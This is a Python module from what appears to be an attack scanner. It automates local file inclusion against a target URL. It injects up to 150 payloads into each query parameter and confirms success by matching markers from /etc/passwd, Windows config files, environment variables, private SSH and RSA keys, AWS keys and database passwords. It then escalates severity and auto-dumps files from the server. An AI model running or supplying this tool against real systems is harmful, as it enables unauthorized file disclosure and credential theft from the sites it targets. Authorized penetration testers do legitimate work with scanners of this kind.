"""lfi — LFI scanner on Probe v2: baseline + verify + auto-dump + escalate"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.probe import Probe
from core.payloads import get

MARKERS = [
    "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:", "sys:x:",
    "[fonts]", "[extensions]", "for 16-bit app support",
    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "REMOTE_ADDR=", "SERVER_SOFTWARE=",
    "-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----",
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "DB_USER",
    "SECRET_KEY", "localhost:3306", "127.0.0.1:6379", "mongodb://",
]


class Lfi:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}

        probe = Probe(session, logger)
        base = probe.baseline_probe(target)
        if not base:
            print("[lfi] no baseline"); return {"findings": []}
        print(f"[lfi] baseline: {base['code']} {base['len']}b")

        payloads = get("lfi", limit=150, mutate_by=0)
        print(f"[lfi] {len(payloads)} payloads on {list(params.keys())}")

        findings = []
        for name in params:
            print(f"\n[lfi] param '{name}'")
            for i, p in enumerate(payloads, 1):
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                )
                r = probe.inject(url_fn, p, detect_markers=MARKERS)
                if not r["hit"] or not r["reason"].startswith("marker:"):
                    if i % 40 == 0:
                        print(f"  · {i}/{len(payloads)}, {len(findings)} hits")
                    continue

                # verify
                verified = probe.verify(url_fn, p, detect_markers=MARKERS, times=2)
                if not verified:
                    print(f"  · unverified: {p[:50]}")
                    continue

                marker = r["reason"].split(":", 1)[1]
                sev = probe.escalate_severity("high", r,
                       r.get("response").text if r.get("response") is not None else "")
                print(f"  ✓ [{sev}] {name}={p[:60]} -> {marker}")
                findings.append({
                    "param": name, "payload": p, "marker": marker,
                    "severity": sev, "verified": True,
                })
                logger.finding("lfi", sev, f"{name}={p[:60]} marker={marker}")

                # auto-dump
                probe.auto_dump({"kind": "lfi"}, target, name)
                break  # one confirmed LFI per param is enough

        print(f"\n[lfi] total: {len(findings)} verified")
        print(f"[lfi] stats: {probe.summary()}")
        return {"findings": findings, "stats": probe.summary()}
